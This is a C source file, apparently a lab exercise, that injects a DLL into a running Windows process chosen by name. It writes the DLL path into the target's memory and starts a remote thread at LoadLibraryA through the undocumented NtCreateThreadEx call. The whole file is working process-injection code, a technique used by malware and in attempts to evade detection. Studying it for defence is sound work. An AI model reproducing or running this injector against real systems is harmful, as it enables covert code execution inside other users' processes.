/*
* injector_NET.c 
* DLL injection with undocumented NtCreateThreadEx
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <Windows.h>
#include <tlhelp32.h>
#pragma comment(lib, "Advapi32.lib")

typedef struct _CLIENT_ID {
	HANDLE UniqueProcess;
	HANDLE UniqueThread;
} CLIENT_ID, * PCLIENT_ID;

typedef NTSTATUS(NTAPI* pfnRtlCreateUserThread)(
	IN HANDLE ProcessHandle,
	IN PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL,
	IN BOOLEAN CreateSuspended,
	IN ULONG StackZeroBits OPTIONAL,
	IN SIZE_T StackReserve OPTIONAL,
	IN SIZE_T StackCommit OPTIONAL,
	IN PTHREAD_START_ROUTINE StartAddress,
	IN PVOID Parameter OPTIONAL,
	OUT PHANDLE ThreadHandle OPTIONAL,
	OUT PCLIENT_ID ClientId OPTIONAL);

typedef NTSTATUS(NTAPI* pfnNtCreateThreadEx)
(
	OUT PHANDLE hThread,
	IN ACCESS_MASK DesiredAccess,
	IN PVOID ObjectAttributes,
	IN HANDLE ProcessHandle,
	IN PVOID lpStartAddress,
	IN PVOID lpParameter,
	IN ULONG Flags,
	IN SIZE_T StackZeroBits,
	IN SIZE_T SizeOfStackCommit,
	IN SIZE_T SizeOfStackReserve,
	OUT PVOID lpBytesBuffer
	);

#define NT_SUCCESS(x) ((x) >= 0)

// Utilitary function : display windows error pessages linked to
// GetLastError() with a contextual prefix
void PrintLastError(const char* context) {
	DWORD errorCode = GetLastError();
	LPSTR messageBuffer = NULL;

	FormatMessageA(
		FORMAT_MESSAGE_ALLOCATE_BUFFER |
		FORMAT_MESSAGE_FROM_SYSTEM |
		FORMAT_MESSAGE_IGNORE_INSERTS,
		NULL,
		errorCode,
		MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
		(LPSTR)&messageBuffer,
		0,
		NULL
	);

	printf("[!] %s - Error %lu : %s\n",
		context,
		errorCode,
		messageBuffer ? messageBuffer : "Uknown message");

	if (messageBuffer)
		LocalFree(messageBuffer);
}

DWORD GetProcessIdByName(const char* processName) {
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (snapshot == INVALID_HANDLE_VALUE) {
		PrintLastError("CreateToolhelp32Snapshot");
		return 0;
	}

	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);

	DWORD pid = 0;

	if (Process32First(snapshot, &entry)) {
		do {
			// Comparison non case-sensitive
			if (_stricmp(entry.szExeFile, processName) == 0) {
				pid = entry.th32ProcessID;
				break;
			}
		} while (Process32Next(snapshot, &entry));
	}

	CloseHandle(snapshot);
	return pid;
}



int main(int argc, char* argv[]) {
	// 0.Arguments checking
	if (argc != 3) {
		printf("Usage : %s <program_name.exe> <absolute_path_dll>", argv[0]);
		printf("Exemple : %s notepad.exe C:\\labs\\labdll.dll\n", argv[0]);
		return 1;
	}

	const char* targetProcess = argv[1];
	const char* dllPath = argv[2];
	SIZE_T      dllPathLen = strlen(dllPath) + 1; // +1 for the null terminator

	printf("[*] Cible      : %s\n", targetProcess);
	printf("[*] DLL        : %s\n", dllPath);


	// 1.Fint target's PID

	DWORD pid = GetProcessIdByName(targetProcess);
	if (pid == 0) {
		printf("[!] Can't find '%s' process. Is he running ?", targetProcess);
		return -1;
	}

	printf("[+] PID found : %lu\n", pid);


	// 2.Open the process with MINIMAL rights
	// do NOT use PROCESS_ALL_ACCESS
	DWORD desiredAccess =
		PROCESS_VM_WRITE |         // WriteProcessMemory
		PROCESS_VM_OPERATION |     // VirtualAllocEx
		PROCESS_VM_READ |
		PROCESS_CREATE_THREAD |    // CreateRemoteThread
		PROCESS_QUERY_INFORMATION;

	HANDLE hProcess = OpenProcess(desiredAccess, FALSE, pid);
	if (hProcess == NULL) {
		PrintLastError("OpenProcess");
		return -2;
	}
	printf("[+] Handle processus obtenu : 0x%p\n", hProcess);

	// 3.Allocate memory to the targeted process
	// PAGE_READWRITE : we write a string, no some executable code
	LPVOID remoteMem = VirtualAllocEx(
		hProcess,
		NULL,
		dllPathLen,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_READWRITE
	);

	if (remoteMem == NULL) {
		PrintLastError("VirtualAllocEx");
		CloseHandle(hProcess);
		return 1;
	}

	printf("[*] Memory allocated in the target at : 0x%p (%zu octets) \n",
		remoteMem, dllPathLen);

	// 4. Write the path pf the DLL in the target memory
	SIZE_T bytesWritten = 0;
	BOOL writeOk = WriteProcessMemory(
		hProcess,
		remoteMem,
		dllPath,
		dllPathLen,
		&bytesWritten
	);

	if (!writeOk) {
		PrintLastError("WriteProcessMemory");
		VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
		CloseHandle(hProcess);
		return 1;
	}
	printf("[+] DLL path write (%zu bytes)\n", bytesWritten);

	// 5. Get the address of LoadLibraryA in THIS process
	//    This address is also valid in notepad too

	HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
	if (hKernel32 == NULL) {
		PrintLastError("GetModuleHandleA");
		VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
		CloseHandle(hProcess);
		return 1;
	}

	PVOID loadLibraryAddr = (PVOID)GetProcAddress(hKernel32, "LoadLibraryA");
	// we're creating the NtCreateThreadEx variabke
	pfnNtCreateThreadEx NtCreateThreadEx = (pfnNtCreateThreadEx)(UINT_PTR)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtCreateThreadEx");
	if (NtCreateThreadEx == NULL)
	{
		CloseHandle(hProcess);
		printf("[!]NtCreateThreadEx error \n");
		return -3;
	}

	if (loadLibraryAddr == NULL) {
		PrintLastError("GetProcAddress");
		VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
		CloseHandle(hProcess);
		return -4;
	}
	printf("[+] Address of LoadLivraaryA : 0x%p\n", (void*)loadLibraryAddr);


	// 6. Create a distant thread which will call the LoadLibraryA(dllPath)

	DWORD remoteThreadId = 0;
	HANDLE hThread = NULL;
	NtCreateThreadEx(&hThread, 0x1FFFFF, NULL, hProcess, (PVOID)loadLibraryAddr, remoteMem, FALSE, 0, 0, 0, NULL);

	if (hThread == NULL) {
		PrintLastError("NtCreateThreadEx");
		VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
		CloseHandle(hProcess);
		return -5;
	}
	if (WaitForSingleObject(hThread, INFINITE) == WAIT_FAILED)
	{
		printf("[!] WaitForSingleObject error \n");
		return -6;
	}
	printf("[+] Thread distant créé (TID : %lu\n", remoteThreadId);


	// 7. Waiting for the thread to end (DLL loaded)
	//    then clean up the resources 
	printf("[*] Wait the ending of the remote thread...\n ");
	WaitForSingleObject(hThread, 5000); // timeout 5 sec

	DWORD exitCode = 0;
	GetExitCodeThread(hThread, &exitCode);
	// exit code is the returnv value of loadLibraryA :
	// non-null = success , 0 = failed
	printf("[+] Thread ended. LoadLibrary return code : 0x%lx\n", exitCode);

	if (exitCode == 0) {
		printf("[!] LoadLibraryA failed in the target process.\n");
		printf("[!] Check the absolute path and accessebility of the DLL");
	}
	else {
		printf("[+] Injection done (Via NtCreateThreadEx) !");
	}

	// Nettoyage
	CloseHandle(hThread);
	VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
	CloseHandle(hProcess);

	return 0;

}

